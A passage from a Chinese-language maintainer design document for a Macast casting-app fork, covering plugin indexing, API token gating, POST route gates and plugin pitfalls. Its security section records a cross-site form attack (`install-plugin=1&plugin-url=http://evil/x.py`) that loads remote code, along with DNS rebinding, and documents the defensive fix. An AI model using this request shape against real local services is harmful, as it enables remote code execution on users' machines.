Z=dist/Macast.app/Contents/Resources/lib/python312.zip
python3 -c "import zipfile;print([n for n in zipfile.ZipFile('$Z').namelist() if n.startswith('requests/')])"
```

产物校验手法见 `BUILDING.md` 的 "Verify the bundled plugins actually made it into the artefact"。

### 4.5 插件清单（`<macast.*>`）只在**文件顶部注释**里解析

`_read_plugin_metadata` 先截出开头连续的注释块，再用
`<macast\.([\w.]+)>([^<]*)</macast\.[\w.]+>` 解析。两条约束都是被踩出来的：

- **值里不能出现 `<`。** 早先用 `(.*?)` + `re.S`，于是后面任何一处提到闭合标签的
  注释都会成为假终止符，把中间的标签整段吞掉。给 PotPlayer 写"原作者的 platform
  标签闭合写错了"这句注释时，就把 `renderer` 的值污染成了半句话。
- **只读头部。** 扫码全文只会给正文/文档制造被误认成清单的机会。

`_guess_plugin_class` 是兜底：清单写错类名时按模块体里的类反推，不再直接丢插件。

### 4.5b 插件卡片的作者 / 头像 / 描述（`setting.html`「插件」tab，Part 45）

设置页每张插件卡显示 `<macast.author>`、`<macast.desc>` 与一个头像。三条都已定死并有 Part 45 守着：

- **作者一律以 `pingod` 开头。** 本 fork 自研的插件写 `pingod`；**6 个 vendored 插件写混合作者**
  `pingod（原作者 xfangfang）`（`live.py` 是 `dushan555`）—— 我们不把他人的代码署成自己的名，
  但主名是维护者。文件头的版权声明与 "Copied from" 行**不动**（那是 §4.12 台账的证据）。
- **描述一律中文。** 每个 `macast/plugins/*.py` 的 `<macast.desc>` 必须含中日韩字符；
  `MacastPlugin._builtin_desc(kind)`（内置插件没写自己 `<macast.desc>` 时的兜底，核心三张卡走这条）
  也必须是中文，否则英文 "Built-in renderer." 会漏到中文卡片上。
- **头像走本地图 `/assets/avatar.png`，绝不再按卡片请求 `api.github.com/users/<author>`。**
  那个 host 正是国内网络会卡住的那一个，而十几张卡拉的都是同一个 pingod 头像。
  因此 `setting.html` 里**不允许**出现 `api.github.com/users` 或 `get_github_avatar`；
  `circleUrl` 的初值就是本地资源路径。头像由 `macast/assets/icon.png` 裁成圆形衍生而来。

### 4.6 插件索引与内置策略：地址只有一处，页面不写死

本仓库的 15 个第一方插件**全部内置**（`macast/plugins/renderer/` 与 `macast/plugins/protocol/`，
见代码地图），应用启动时由 `MacastPluginManager._load_bundled_plugins` 自动加载，无需在线索引。
因此仓库根目录的 `plugins/info.json` 现在是**空索引**（`"plugin_v1": []`）—— 不再出现"可更新"
角标，也不会和内置插件重复出卡片（Part 5c 守着"索引不得重复列出内置插件"）。

现在的做法：

- 仓库坐标与索引地址只在 **`macast/plugin_repo.py`**（`pingod/Macast` →
  `plugins/info.json`），由 `/api?query=plugin-info` 的 `plugin_repo` 字段下发；
  `setting.html` 里**不允许**再出现任何插件仓库 URL（Part 5c 有用例守着）。
- **前提：本仓库是**私有**的，所以在线索引对别人是坏的 —— 而这件事已经是决定，不是待办。**
  jsDelivr 与 raw 都读不到私有仓库，而下载插件时 Macast 不带凭据 —— 卡片照常渲染、
  「安装」才失败。判据与逐条实测结果见 §5 相应条目（9 条固定链接已有 4 条 404，
  剩下 5 条是 CDN 在仓库还可读时缓存的副本，会逐个掉光）。
  Part 5c 的 `git show <sha>:plugins/<file>` 只证明「条目 == 所指内容」，**不证明可达**，
  两者不要混。
  **2026-09-21 用户选定：保持私有，官方只承诺手动安装**（设置页「从网址安装」/
  把 `.py` 放进配置目录的 `renderer/`、`protocol/`）。所以：
  ① **不要再提"改公开 / 另立公开仓库"**，那是已经回答过的问题；
  ② 索引、`plugins/README.md`、`docs/Casting-Suite.md`、设置页文案都必须把「这里只有源码」
  说在前面，别让人把安装失败当网络问题排半天；
  ③ `scripts/check_index_reachability.py` 在私有状态下稳定报 `INDEX_PRIVATE`
  （退出码 2）—— **这是预期信号，不是待修的 bug**，也正因为如此它不能被当成"成功"。
  `scripts/selfcheck.py` 的「online plugin index」段把这三问都替用户跑一遍
  （GitHub 匿名 + 公开上游对照组 + jsDelivr 元数据 API + 逐条固定链接）。
- 索引本体在**仓库根目录**的 `plugins/info.json`（不是 `macast/plugins/`，后者是内置插件）：
  当前为**空索引**（`"plugin_v1": []`），页面只显示本机已内置的插件，不报错。需要发布第三方
  索引时再往里加条目（见下）。
- **索引本身**（唯一一个没法固定 SHA 的文件）走三个地址，按「新鲜度」排序：
  `raw.githubusercontent.com`（永远最新，国内常拉不动）→
  `ghproxy.net/https://raw.githubusercontent.com/...`（国内可达；自称 `max-age=300`，
  实测推送 6 分钟后仍给旧文件）→ `cdn.jsdelivr.net`（**分支文件缓存数小时、`?v=` 也破不了**）。
  也就是说索引最多可能滞后几小时，**但它只影响「新插件多久能被看到」**，装到手的文件永远是对的
  （安装 URL 固定了 SHA，见下）。
  浏览器按序回退；三者都必须返回 CORS 头，因为这是在**浏览器里** fetch，不是 Python 抓。
  改顺序前先想一遍：把会缓存的放前面 = 用户看到的插件列表可能落后半天。
- **设置页拉索引必须带时间戳查询串**（`?t=Date.now()`）：只治**浏览器**的 HTTP 缓存 ——
  索引刚推上去时普通刷新常常还在吃旧副本，「插件卡片不见了」多数就是这么来的。
  CDN 服务端缓存会忽略未知参数，所以固定 SHA 那套不受影响。Part 5c 有用例守着。
- **「启用国内镜像地址」**（`Github_CN_Mirror`，缺 key == 关；关掉走 `Setting.unset` 而不是
  存 `False`）：一个开关改写**所有运行时 fetch 的 GitHub 地址** —— 插件索引（`index_urls()`
  去重后 ghproxy → jsDelivr）、「从网址安装」的下载（`install_url()`）、版本检查
  （api.github.com / releases）、「打开插件仓库」按钮。改写规则只有三个 host 前缀
  （github.com / raw.githubusercontent.com / api.github.com → 加 `https://ghproxy.net/` 前缀），
  **jsDelivr 本身就是国内可达的镜像，绝不再加前缀**。全部逻辑在 `plugin_repo.py`
  （`to_mirror_url` 纯函数 / `mirror_url` 按开关 / `index_urls` / `describe`），页面只发
  `POST set-github-mirror`（在 `Handler.POST_ROUTES` 表里，门 = 管理，见 §4.7c），
  **页面里不允许出现镜像前缀
  字符串** —— Part 5c 有 `"ghproxy" not in _html` 这条用例。切换成功后后端直接回传新的
  `describe()`，页面立刻按新地址重拉索引。
- 往 `plugins/info.json` 里加条目时：`renderer`/`protocol` 字段是「本机装没装」的判定键，
  `version` 必须与 `.py` 里 `<macast.version>` 一致，否则又是假的「可更新」。整个条目
  和 `.py` 顶部清单必须逐字对齐 —— Part 5c 会比对 title / version / platform / 类名。
- 条目的 `url` **固定到 commit SHA**（`https://cdn.jsdelivr.net/gh/pingod/Macast@<sha>/plugins/<file>.py`），
  绝不指向分支。原因是一轮实测：分支引用会被中间缓存长期冻结 —— jsDelivr 缓存数小时、
  **`?v=` 查询串破不了它**（把插件升到 0.2 后请求 `?v=0.2` 拿回来仍是 0.1 的内容），
  ghproxy 自称 `cache-control: max-age=300`，实测推送后 6 分钟仍在给旧文件。
  固定 SHA 之后内容不变，缓存多旧都是对的（raw 直链在国内还是经常拉不动，所以走 jsDelivr 的 CDN 入口）。
  代价是插件更新的流程变成两步：**① 先提交插件文件；② 再把条目里的 SHA/version 指到那个提交**。
  Part 5c 用 `git show <sha>:plugins/<file>` 校验「条目 ↔ 所固定内容」一致，忘了第 ② 步会当场变红。
  安装是 Python 侧 `requests`（`MacastPluginManager.install_url`）拉的，没有浏览器多地址回退，
  出问题时把 raw 直链粘到设置页的「从网址安装」即可（后端本来就先 `split('?')[0]` 再判 `.py`）。
- 第三方/用户自建插件与内置插件是**两回事**：放进 `plugins/info.json` 索引、由用户从设置页
  「从网址安装」或把 `.py` 丢进配置目录 `renderer/`、`protocol/` 的，是「单个 .py、只能用
  Macast 自带依赖 + 标准库 + 外部命令」；需要 pip 库或要随包发布的第一方插件一律走
  `macast/plugins/`（并同步 §4.4 的三处打包配置）。
- **「只能用自带依赖」现在是一条会被测红的规则**（Part 30）：每个 `macast/plugins/*.py` 的 import
  取根名，必须落在 `标准库 ∪ requirements/*.txt 声明的包提供的顶层模块 ∪ {macast, macast_renderer}`
  里，否则就是"插件里塞了个 pip 库"。平台专属的名字走 `_PLATFORM_OPTIONAL` 表
  （模块名 → 发行包 → 哪个 requirements 文件声明了它），因为**在 Linux 上跑套件时
  `importlib.metadata` 根本看不见 pyobjc**，只能按规则放行、再由"那个文件真的声明了它"兜住。
  第二张表 `_OPTIONAL_BY_FALLBACK` 收的是另一类：**任何构建都不装、靠代码自己降级**的模块
  （现仅 `win32api` / `win32con` —— `potplayer.py` 只用它读注册表拿 PotPlayer 安装路径，
  代码自己写着 "missing pywin32 … mean 'ask the next source', not 'fail'"，依次回退到用户
  配置路径与两个默认安装位置）。放行条件是**把断言验回代码上**：该 import 必须真的坐在
  `try/except ImportError` 里、且在 except 里被赋成 `None`，否则不放行 —— 不然这张表就是
  "什么都不声明、什么都能 import"的后门。**别把它塞进 `_PLATFORM_OPTIONAL`**：那要求一个
  windows requirements 文件，而没有任何 job 会安装它，等于把 §4.3 的错反着犯一遍。
  `cheroot` 是同一族问题的另一面：`nirvana.py` 直接子类化 `cheroot.server.*`，而 cheroot
  只是 cherrypy 的传递依赖 —— 已按 darwin.txt 对 pyperclip/pyobjc 的同一条原则在
  `requirements/common.txt` 里点名。
  **pyobjc 之问有结论了**：`screen_mirror._create_aggregate` 用的 `Foundation`（以及
  `_cf_to_str` 用的 `objc`）**是合法的**，因为 `macast/utils.py` 在 `sys.platform == 'darwin'`
  下就 import 了 `AppKit` —— 同一个发行包 `pyobjc-framework-Cocoa`，核心代码先它一步依赖。
  但按 §4.3 的教训**不再让它靠 `rumps` 顺带进来**：`requirements/darwin.txt` 与 CI 的
  macOS pip 列表都点名了它，Part 30 同时守着这两处，还有两条用例守着
  `macast/plugins/renderer/screen_mirror.py` 不能把 pyobjc 提到**模块顶层**（提到了 Windows/Linux 就整个加载不了）。
  **到了 ScreenCaptureKit 这一轮（2026-10，v0.21）同一套机制被复用了两遍**：
  `screen_mirror` 的 macOS 13+ 快路要 `ScreenCaptureKit` + `CoreMedia` 两个 pyobjc 包
  （import 同样在函数体里 —— 提到模块顶层 Windows/Linux 就整个加载不了），
  于是 `_PLATFORM_OPTIONAL` 新增两行，两条"这个文件真的声明了它"的用例自动派生；
  `_darwin30 - _ci30` 那条继续覆盖 macOS CI 列表，`_hoisted` 那条继续守模块顶层。
  **唯一没被自动覆盖的是 `.app` 构建自己的那张表**：py2app 的 modulegraph 看不见函数体内
  的 import（与 §4.4 的动态导入是同一片盲区），从 `scripts/setup_py2app.py` 的 `includes`
  里丢一个条目，产物照样构建、照样启动、**静默停在 avfoundation 上**。所以 Part 55 有一条
  按名字点名这两个条目的用例 —— 三处打包配置里，只有这一处没有声明面推着，需要人记得。

索引格式、字段表与验证命令见 `plugins/README.md`。

### 4.7 网页投屏入口：GET 版即使来自本机也要求令牌

给「只能打开网址」的调用方（iOS 快捷指令、书签、`curl`、脚本）留了
`GET /api?query=cast&url=<绝对地址>&token=<令牌>`，绕开 DLNA 发现。设置页重投历史用的
`POST cast-uri` 语义保持不变。

- **GET 版必须带令牌，loopback 也不例外**：任何网页都能发一个
  `GET http://127.0.0.1:58880/api?query=cast&...`（`<img>` / `fetch`）。若沿用
  「本机即可信」，就等于随便哪个网页都能指使你的 Mac 开始播片。POST 版没这条通道，
  所以继续信任 loopback —— 但 `cast-uri` 在表里的门就是 `GATE_MANAGEMENT`（§4.7c），
  它靠的正是 `_management_allowed()` 的本机判定，**动这里之前先想清楚 CSRF**。
- **令牌常驻**：`protocol.api_token()` 存在 `macast_setting.json` 的 `Api_Token`，
  首次使用时生成（`threading.Lock` 串行化，避免并发首用生成两个）。以前它是
  `secrets.token_hex(16)` 每进程随机、且从不显示在任何地方 —— 等于管理 API 对
  「另一台设备」永久不可用，快捷指令根本没法配。改完必须保持稳定，否则已配好的
  快捷指令会在下次启动后 403。
- 令牌出现在两处：设置页「状态 → 网页投屏入口」（可复制，附 curl 例子）和高级设置的
  JSON 里。`cast-info` 查询本身走管理门控（本机 / HTTPS / 令牌），局域网拿不到它 ——
  这是「令牌不外泄」的唯一防线，别把它从门控名单里删掉。
- 回归用例是 Part 12（19 条）。它借 CherryPy 在**无请求上下文**时给出的假 loopback
  请求真跑门控（`cherrypy.serving.request` 可直接改 `params` / `headers` / `remote` /
  `scheme`），不需要真起服务；唯一被打桩的是 `Setting.is_service_running`（GET 在服务
  未启动时会回 503）。

### 4.7b 管理 POST 的两道新门：跨站表单与"会落代码"的那三条（Part 48）

2026-09-25 实测：用户访问一个恶意网页，它向 `http://127.0.0.1:58880/api` 提交一个
`application/x-www-form-urlencoded` 的 form（**simple request，浏览器不发预检**），字段
`install-plugin=1&plugin-url=http://evil/x.py`，服务端 `_management_allowed()` 只看
`remote.ip` ⇒ 门开 ⇒ 下载 ⇒ `import` ⇒ **那个 .py 的模块级那一行以用户身份执行**
（不需要用户去启用那个渲染器）。这条链在真实例上跑通过（修复前 4/4），现在也跑得通
（修复后：两种攻击形状各自 403、插件目录与载荷标记文件都没落地；两种合法形状仍然真的装上）。
细节与验收记在 `docs/architecture-review-2026-09.md` 的 R1「已修」一节。

两道门，**缺一不可**，都在 `macast/protocol.py`：

1. **`Handler._same_site()`：所有 POST 的第一问。** `Origin` →（缺失时）`Referer`；
   两者都没有就**不是浏览器**（curl / 快捷指令 / HA），继续按地址 + 令牌判。有则归一化成
   `(host, port)`（`site_of()`：小写、去尾点、去 80/443、IPv6 去方括号），再问是不是
   这台机器自己的网址（`_page_host_names()`：回环三种拼法 ∪ `advertisable_addresses()`
   ∪ `Setting.get_advertisable_ip()` ∪ 主机名/短名/`.local`）。
   - **判据绝不是"这个域名解不解析到我"** —— DNS 重绑定下攻击者那个域**恰恰**解析到
     `127.0.0.1`，那就是这一招本身。所以是"名字比对"，不是"地址比对"。
   - **端口不参与判定**（docstring 里写着原因）：58880 被占时 Macast 自己回退到随机端口，
     钉死会把自家页面挡在外面，而这里根本没有 cookie 可骑。
   - 被拒时消息必须**同时**说出"你从哪个网址来的"和"该用哪个网址"，否则用户读到的是
     一个像令牌错的东西。
   - `Origin` 优先于 `Referer`（页面能自己挑 `Referer`），读不懂的 `Origin` 一律拒。
2. **`_CODE_EXECUTION_PARAMS` + `_code_execution_allowed()`：落代码的只认令牌。**
   `install-plugin`、`save-launch-param`（整体覆盖设置并重启）、`set-module-setting`
   （自动化钩子的键写在这里，值进 `subprocess(shell=True)`），外加 `plugin-file` 上传。
   **loopback 在这一层不算数** —— 重绑定下"本机"这个事实毫无信息量。`mirror-action`
   不在名单里，它早有自家令牌判定（§4.7 的先例）。
   用例还钉住"这一名单必须是 `_MANAGEMENT_PARAMS` 的子集"，否则可能出现"落代码却不受管"的字段。
   （自 §4.7c 起，这两份名单都从 `Handler.POST_ROUTES` 派生，所以这条子集关系是**结构成立**的；
   真正还钉着的是另一头 —— 表里 `GATE_CODE` 那三行必须恰好是这一名单。）

**页面侧必须带令牌，且取不到就不发**：共享的 `management_token()`（令牌来自本机门控的
`query=cast-info`）+ `require_management_token(fd)`，五条流程各就各位 ——
`install` / `install_from_url` / `save`（高级设置）/ `post_module_setting`
（`save_module_setting` 与 `remove_module_setting` 都收口到它）/
`on_plugin_before`。**`el-upload` 自己不会带令牌**：`before-upload` 改成 `async`，
先 `await` 把令牌取回来（Element UI 会等这个 Promise，resolve 非 File 值照样继续发），
`$nextTick()` 之后 `:data="{ 'plugin-type': …, token: cast_info.token }"` 才是有值的。
套件里没有浏览器，所以页面这半份是**文本契约**（§4.13 的方法），变异体"某条流程漏带令牌"
会让对应那条变红。

**已知代价（是决定，不是待办）**：用 Macast 叫不出名字的主机名打开设置页（自建反向代理、
少见的 DNS 别名）时管理 POST 会被拒，提示让用户改用 `http://127.0.0.1:<端口>/`。
没有改成"再信 `Host` 头"，因为 `Host` 在重绑定下同样毫无信息量 —— 那条路挡不住要挡的东西。
**仍然成立的边界**：拿到令牌 = 能落代码（这是设计如此，PoC 的正控就是这么写的），
所以令牌的保密性就是这条链的强度；局域网侧拿不到令牌（`cast-info` 在门控名单里）。

### 4.7c 一张表决定所有 POST 的门（`Handler.POST_ROUTES`，Part 51）

§4.7b 那两道门当初是**手写在 `POST()` 的十几个 `elif` 里的**，每条分支自己决定用令牌、
用本机、还是不用门 —— 这正是 R1 的成因：**"漏一个端点没加门"这类错误在结构上看不见**。
现在门是**数据**：`Handler.POST_ROUTES` 一行一个端点 `(字段, 门, 方法名)`，
`FILE_ROUTES` 管上传（按字段名，`plugin-file` = `GATE_CODE`；没登记的文件字段吃
`FILE_GATE_DEFAULT` = 管理门），`POST()` 只做两件事 —— `_same_site()` 和按表走一遍。
三条门名 `GATE_MANAGEMENT` / `GATE_TOKEN` / `GATE_CODE`，各自那句 403 收在
`GATE_REFUSALS` 里（**一条路由不能自己写拒绝文案，也不能不写**）。

- **顺序即语义**：`POST_ROUTES` 是 **tuple 不是 dict** —— 一个请求带两个 action 字段时，
  排在前面的那条赢，后面的根本不跑（Part 51 有 precedence 用例）。旧代码同样是"第一个
  匹配的 `elif` 赢"，所以这次改造**逐行保住了原顺序**，没有改任何一条的判定。
- **`_MANAGEMENT_PARAMS` / `_CODE_EXECUTION_PARAMS` 现在是从表里派生的**，不是另抄一份。
  旧文档里"某某在 `_MANAGEMENT_PARAMS` 名单里"这类说法，读法改成"某某在表里，门是 X"。
  顺带记一条**语义没变、名单变了**：旧的那份字面名单只有 12 条，`cast-uri`、
  `set-subtitle-show`、`clear-play-history`、`clear-log` 不在其中 —— 它们各自在分支里
  就地调 `_management_allowed()`，所以从不经过顶部那道批量检查。派生名单现在把它们算进去
  （= 表里全部 16 条），因为按定义"能被 POST 的都至少受管理门"；这不影响任何一条的判定，
  但谁要拿这个名单去推断"旧版谁走了顶部批量检查"，答案已经不再是它。
- **`_gate_refusal()` 的三道检查是累积且有序的**：`token` 与 `code-execution` 都先要过
  管理门，所以局域网无令牌的请求听到的仍是管理那句 —— 和当初手写分支的措辞逐字一致。
  **门名不认识就拒绝**（fail closed）：表里写错一个门，后果是那个端点谁都进不来，
  而不是谁都进得来。
- **fall-through 从"报成功"改成了"报没做"**：这是这一趟顺手抓到的**真 bug** ——
  旧 `POST()` 走到末尾返回 `{'code': 0, 'message': 'success'}`，于是字段名拼错
  （`clear-logg`）、或页面加了一个后端从没听过的按钮，用户读到的是"已保存"而什么都没发生。
  现在回 `code: 1` 并把不认识的字段**念回给调用方**，同时 `logger.error` 一条。
  `POST_HELPER_PARAMS` 是"贴在 action 旁边的字段"（token / key / value / plugin-url …），
  它们不该被念成"不认识的字段"，也不该单独构成一次操作。
- **Part 51 的门覆盖是"按表循环"，不是按记忆点名**：把表里**每一行**都拿一个局域网、
  无令牌的请求打一遍，断言 403 **且那条路由的方法一次都没被调用**（逐行装 spy），
  再带令牌打一遍，断言每一行真的被服务到；另有一条"这个循环不为空（≥16 行）"，
  防止哪天把表读成空元组、于是"全部端点都被验证过"是一句真空话。
  还有 AST 扫描（范围**限定在 `class Handler` 内**）钉住：`POST` 恰好一个、
  不直接调用任何门判定（`_same_site` 除外，它就是那条链的第一问）、
  必须读 `POST_ROUTES` / `FILE_ROUTES` / `_gate_refusal`、且不许把任何路由字段名
  硬编码进 `POST` —— **否则这张表就变成文档，而文档正是 R1 写下的那种东西**。
- **页面侧对齐**：用例从 `setting.html` 抽出所有 `append('字段'…)`、三元表达式里的字段名、
  以及 `name="…"`（后者只与 `FILE_ROUTES` 求交，避免撞上普通表单输入），要求
  **页面能 POST 的每个字段都在表里登记**，且至少有 10 个 action。这是"新增按钮悄悄落到
  一个不认识它的分发器上"唯一能被机器抓住的时刻。
- **诚实的一条**：这一趟 `Handler` 类**变大了**（≈846 行 → ≈980 行），因为 16 个 `_post_*` 薄包装
  现在都住在类里，而旧的分支体本来就挤在同一个函数里。省下的不是行数，是"读一处就知道所有门"。
  下一步如果是拆，方向是**按面拆文件**（管理 API / DLNA 收流 / 页面资源），那是独立一步，
  别和改判定混在同一次提交里。
- 四个变异体各自只在自己那一句话上变红：**A** 把未识别请求的返回值改回 "success" ⇒ 3 条；
  **B** 删掉表里的一行（`set-module-setting`）⇒ 9 条（派生名单、按表循环、页面侧对齐三处同时塌，
  这正是"少一条在结构上可见"的意思）；**C** 把 `mirror-action` 的门从 `GATE_TOKEN` 降成
  `GATE_MANAGEMENT` ⇒ 3 条；**D** 让未知门名放行（fail open）⇒ 1 条。
  还原后 `protocol.py` 与改动前逐字节一致（md5 比对）。
  其中一个（B）抓出的是**测试自己的**休眠分支：
  `gate_of()` 读模块而非类，只在被扫到那一行才 `AttributeError` ——
  已改读 `protocol.Handler.FILE_ROUTES`，并补一条 `gate_of('plugin-file') == GATE_CODE`
  让这条分支每次跑都被经过。

### 4.8 内置插件目录（`macast/plugins/`）：15 个插件，各自的红线

`macast/plugins/` 内置 15 个第一方插件：6 个来自上游合集 `Macast-plugins`
（`iina` / `web` / `live` / `potplayer` / `pi_fm` 渲染器 + `nirvana` 协议，状态 `vendored`），
以及本 fork 自研的 9 个单文件插件（yt-dlp 下载 `macast_ytdlp` / 外部播放器 `external_player` /
小窗+壁纸 `floating` / 自动化钩子 `hooks` / Chromecast 中继 `cast_bridge` / AirPlay 音频 `raop` /
屏幕镜像 `screen_mirror` / 本地文件投屏 `cast_local_file` / AirPlay 镜像接收 `airplay_mirror`）。
这 9 个自研插件是**单文件**插件，所以：

- 只能用「Macast 已带的库 + 标准库 + 机器上已有的命令行程序」。要 pip 库就走内置插件
  路线（§4.4 的三处打包配置）。
- **Macast 一次只能选一种渲染器**：12 个渲染器类插件互斥（菜单栏切换；含上游合集的
  `iina` / `web` / `live` / `potplayer` / `pi_fm`），`raop` 与 `airplay_mirror` 是协议插件，
  可以和任意渲染器共存。
- 定位一律用 PATH + 常见安装目录（GUI 从 Finder 启动拿不到 shell 的 PATH；`yt-dlp`
  / `shairport-sync` / `uxplay` / 播放器都踩这条，且**都在插件启动时再找**，不是 import 时）。

最容易踩的几处，改这些插件前先看：

| 插件 | 红线 |
|---|---|
| yt-dlp | 下载模式**不启动 mpv**，所以它覆写了 `start/stop`，并用 `_mpv_started` 记住「mpv 到底起没起」——`MPVRenderer.stop()` 会 join 只有真起过才存在的线程。流模式把 ytdl 路径**合并进已有的 `--script-opts`**（再写一条会顶掉 OSC 的设置）。 |
| external_player | 播放器用 **argv 列表**启动，绝不拼命令行（url 来自网络）。暂停不实现，停止只杀自己起的进程。 |
| floating | 覆写 `build_mpv_params` 前先**删掉继承来的 `--geometry/--autofit/--fullscreen/--ontop-level`**，否则会和全局 Player Size 打架。壁纸模式要先探测 mpv 是否认识 `--ontop-level=desktop`：未知选项会让 mpv 起不来，而启动器的反应是重试 3 次后**把服务停掉**。 |
| hooks | 命令是 shell 命令（用户自己写的），但 **url 只走环境变量**，不拼进命令串。spawn 完即返回，不阻塞 CherryPy 工作线程。 |
| cast_bridge | 复用 `protocol_cast` 的 Cast v2 收发，不引 pychromecast。投屏序列是 deviceauth CHALLENGE → CONNECT receiver-0 → LAUNCH → CONNECT transportId → LOAD，`transportId` 来自 LAUNCH 的回复，**不要硬编码**。发现用 mDNS 且必须在后台跑（`build_menu` 在 UI 线程上）。 |
| raop | 只监督 shairport-sync（生成最小配置 + 拉起 + 报连接/断开），**不**把 RAOP 映射成 DLNA 播放状态。`uses_ssdp = False`，否则只有它启用时也会把 SSDP 服务拉起来。v0.2 起有第一个持久化配置 `RAOP_Device_Name`（覆盖服务名，缺省跟随友好名；见 §4.11）。 |
| airplay_mirror | 只监督 **uxplay**（iPhone 的「屏幕镜像」列表里那个接收端在这台 Mac 上就是它），`uses_ssdp = False`，**不**映射 DLNA 播放状态 —— 它和 `raop.py` 是同一族形状。红线五条，全部来自上游源码而不是试错：① **配置走 `-rc <file>`，绝不走 `$UXPLAYRC`** —— 后者在文件不存在时**静默回落 `~/.uxplayrc`**，等于读（甚至被诱导写）用户主目录里的配置；文件写在 `utils.SETTING_DIR` 里，用户附加项**放在末尾**所以能覆盖我们的默认值（rc 后写的赢，argv 又在 rc 之后解析）。② **绝不加 `-p`**：`-p` 是 legacy 固定端口 7100/7000/7001，7000 正是自家 `AIRPLAY_PORT` 和 macOS 自带接收端的地盘；不带 `-p` 时 uxplay 用动态端口并写进自己的 mDNS TXT，发送端照它连，固定端口只有坏处。③ **stdout 必须挂在 pty 上**：uxplay 的 `log()` 是 `printf`，全程序只有一处 `fflush`（音频进度），挂管道 ⇒ **块缓冲** ⇒ "谁连上了"永远不出现；POSIX 用 `pty.openpty()`，Windows 退回管道（用例直接问 `os.isatty(read_fd)` 来守这个契约，比测时序稳）。**父进程必须 `os.close(child_fd)`**，否则读线程永远等不到 EOF。④ **退出上报要认身份**（`self._proc is not proc` 就闭嘴）：`reload()` 之后旧 reader 若照常上报，用户看到的是"uxplay 已退出"而它其实活得好好的。⑤ **与 `raop.py` 抢同一个 mDNS 名字**（uxplay 是完整的 AirPlay 接收端：镜像 + RAOP），所以两个都启用时 iPhone 只有一个入口 —— 不猜、不改名，只在启动时按**已启用协议标题**提示一次（判定要归一化 `lower().replace(' protocol','')`，`"AirPlay Protocol"` 才是内置接收端的真标题，见 §4.2）。**找不到二进制是正常状态不是 bug**：macOS 没有 Homebrew formula、官方 release 不含二进制，必须自己编译 ⇒ 提示里给完整配方而不是"装一下 uxplay"（`selfcheck.py` 给同一段）。 |
| cast_local_file | 直通/转码**按 ffprobe 逐文件判断**，不按扩展名猜（`COPY_CONTAINERS` / `COPY_VIDEO_CODECS` / `COPY_AUDIO_CODECS` 三张表 + `plan()` 的理由字符串会直接出现在菜单里）。转码路径写**会一直变大的临时文件**而不是管道 —— 管道没长度、不能重连、不能拖动，而 DLNA 接收端**根本不播**报不出长度的流；对外长度 = 时长 × 码率并压在 `MAX_ADVERTISED_SIZE = 1.9 GB` 之下（老固件在有符号 32 位里做这件事），被这个上限卡住时**降码率**而不是谎报长度。**HTTP 语义三条红线**：① `parse_range(None)` 回 `(0, None)` 是「从头」= 整文件答案，**不是** partial —— 只有客户端真发了 `Range` 才配 206 + `Content-Range`，否则 200 且不发 `Content-Range`（写成 `spec = parse_range(header)` 的代价就是"整文件读也回 206"，Part 25 三条用例抓住它）；② 注册过但**已经消失**的文件必须拒答（`total == 0 and entry.job is None` → `_refuse()`），回一个没有长度的 200 会让播放器永远等字节；③ 读超过写入速度时**等**而不是回短答案。**音轨/字幕/`AudioDelay` 只在转码路径存在**，选了非默认音轨就**改判**为转码（直通是把原始字节交出去，设备的轨道表没法从这边重排）。字幕分三条路：Cast 转 **WebVTT** 进 `LOAD.textTracks[].contentId`、转码路径在**这个 ffmpeg 有 libass** 时烧进画面、DLNA 两条都没有。**停止发 QUIT_APP 不只是 STOP**：只 STOP 会把接收端 app 停在最后一帧，而且**我们自己的 Cast 接收端**也会继续声称还在播那部片子（Part 25 里那条 A/B 就是打在 `macast/protocol_cast.py` 的会话账本上的）。看门狗重投**有预算**（`MAX_REPUSH = 3`，`_begin(retry)` 不吃重投带来的新预算），第 4 次就认输并说明原因；被抢占后重投要按设备上报位置 `Seek`（DLNA 是 `H:MM:SS` 文本）。发现与能力探测（VideoToolbox / libass / 音频采集口）**一律不在 UI 线程**，`_tool_cache` 按工具分键缓存。**avfoundation 的设备表要同时认两种拼写**：真 ffmpeg 打的是 `AVFoundation audio devices:` + 不带引号的 `[0] 名称`，历史上按 `"名称"` 解析的版本**在这台机器上一条都读不到**（症状是"系统声音档位永远说没有采集口"，而不是报错）。发给设备的 SOAP 与其 UTF-8 `Content-Length` 同 screen_mirror 条 ⑤ 的红线（按字节数算，`len(str)` 会被中文设备名截断）。 |
| screen_mirror | 实时链路：ffmpeg 截屏（darwin avfoundation / win32 **ddagrab**（v0.20 起；被桌面拒绝就本次运行内回落 gdigrab，见本行末）/ linux x11grab，**Wayland 不支持要明说**；`-list_devices` 的真实形状是 `AVFoundation video devices:` + `[N] name`，**没有引号**，见 §4.2 末条）→ 插件内 HTTP 服务持续吐一条实时流 → **封装由「输出目标」决定**（`cast` → `video/mp2t` + Cast `LOAD streamType=LIVE`；`browser` → 分片 MP4 `frag_every_frame+empty_moov+default_base_moof`（v0.19 起；v0.10–v0.18 是 `frag_keyframe`，见本行末的延迟重算）+ 自带 MSE 播放页（**页面上有一块 YouTube 那样的推流统计浮层**，顶栏「统计」开关 + `localStorage` 记住；三组数字 = 打开页面时一次性注入的 `page_diag(session)` + 每秒轮 `/browser/stats` 拿发送端计数器 + 播放器自己算的码率/积压/距直播边缘/掉帧。**红线三条**：① 那个端点**只能用 `page_token`**（和页面同一道 `hmac.compare_digest`），**绝不能用常驻 `Api_Token`** —— 观看 URL 会被转发，管理令牌泄露一次等于永久开放管理 API；② **正文里不许再抄一遍 token**（JS 从自己所在的 URL 读回来），且全部文字走 `textContent`；③ 浮层与设置页「统计信息」卡片**必须读同一批计数器**（`page_stats` 与 `stats()` 各自只是转发 `session` + `broadcaster`），谁都不许另算一份 —— 两处答案不一致比没有数字更糟；④ **`PLAYER_PAGE` 必须是 raw 串**（2026-09-24 真浏览器验收：内嵌 JS 的 `'\n'` 被非 raw 的 Python 字符串吃掉 ⇒ 页面抛 `SyntaxError`、面板全空、按钮死、视频不播，而**当时 18 条 Python 用例全绿**；现在用例扫服务端真正吐出的那份 JS：任何 JS 字符串不许跨真实换行，数撇号前先剥掉 `//` 注释）；⑤ **两个"每秒"单位不许共用一个格式化函数**（档位是 bit/s、流量计数器是 byte/s，混用的结果是 4 Mbps 印成 32 Mbps），且**帧率报两个数**：窗口被遮挡时 Chrome 只给 1–2 fps 上屏而解码照旧 24 fps，只报上屏就会把浏览器节流读成"镜像坏了"。它**只在浏览器目标存在**：电视上的画面不在我们手里）。`dlna` → 见下「伪装成文件」）。**编码器不是平台决定的**：`auto` 一旦能力探测给过答案就落在 